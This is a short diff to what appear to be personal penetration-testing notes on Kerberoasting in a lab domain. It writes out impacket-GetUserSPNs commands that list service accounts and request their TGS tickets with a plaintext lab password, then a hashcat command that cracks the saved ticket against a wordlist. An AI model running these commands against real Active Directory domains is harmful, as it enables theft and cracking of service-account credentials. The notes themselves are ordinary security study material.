@@ -29,7 +29,7 @@ impacket-GetUserSPNs -dc-ip 10.1.1.1 marvel.local/forend   //list spns. asks for
 Impacket-GetUserSPNs -dc-ip 10.1.1.1 marvel.local/forend:Password1 -request  
 //this will request tgs for all service accounts // will also tell group membership of each service accounts in the domain   
 
-Impacket-GetUserSPNs -dc-ip 10.1.1.1 marvel.local/forend  
+Impacket-GetUserSPNs -dc-ip 10.1.1.1 marvel.local/forend -request-user sqldev -request -outfile sqldev_tgs   
 //request TGS for user sqldev -outputfile sqldev_tgs //for specific service account and save it to file  
 
 hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt   //for type 23  
